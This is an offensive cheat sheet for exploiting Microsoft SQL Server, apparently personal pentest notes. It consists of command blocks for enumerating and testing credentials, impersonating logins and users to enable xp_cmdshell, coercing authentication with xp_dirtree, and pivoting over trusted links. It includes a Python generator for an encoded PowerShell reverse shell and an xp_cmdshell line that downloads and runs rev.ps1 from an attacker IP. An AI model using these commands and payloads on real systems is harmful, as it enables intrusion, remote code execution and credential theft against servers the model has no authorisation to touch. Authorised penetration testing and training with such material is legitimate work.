# MSSQL Exploitation

> “SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server.”

## Enumeration

```bash
crackmapexec mssql $ip
```

## Check credentials

```bash
crackmapexec mssql 192.168.56.22 -u username -p password -d domain.com
crackmapexec mssql 192.168.56.22 -u vagrant -p vagrant
```

## Prepare impacket

```bash
cd ~/tools/
git clone https://github.com/SecureAuthCorp/impacket myimpacket
cd myimpacket
python3 -m virtualenv myimpacket
source myimpacket/bin/activate
git fetch origin pull/1397/head:1397
git merge 1397
python3 -m pip install .
```

## Connect to mssql

```bash
python3 mssqlclient.py -windows-auth domain.com/username:Password@sqlserver.domain.com
python3 mssqlclient.py -windows-auth sa:sa@sqlserver.domain.com
```

## Execute as login

```bash
enum_logins
exec_as_login <grantor>
enable_xp_cmdshell
xp_cmdshell whoami
```

## Execute as user

```bash
enum_users
exec_as_user <user>
enable_xp_cmdshell
# if dont have permission use enum_impersonate and execute as login
enum_impersonate
enum_db
# if and user can impersonate another user with db is_trustworthy_on
use <database>
exec_as_user <user>
enable_xp_cmdshell
xp_cmdshell whoami
```

## Coerce

```bash
exec master.sys.xp_dirtree '\\listenerIP\test',1,1
```

## Trusted links

```bash
enum_links
use_link <SRV_NAME>
enable_xp_cmdshell
xp_cmdshell whoami
```

## Command Execution

```python
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
#powershell shell here
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```

```bash
xp_cmdshell whoami
xp_cmdshell powershell -exec bypass -enc <base64 here>
xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
```

## PowerUpSQL

### Import

```powershell
Import-Module .\PowerUpSQL.ps1
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
&([scriptblock]::Create((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")))
```

### Commands

```bash
Get-SQLInstanceLocal -Verbose
Get-SQLInstanceDomain -Verbose
```


### References

- https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
- https://h4ms1k.github.io/Red_Team_MSSQL_Server/#
- https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/MSSQL%20database%20penetration%20testing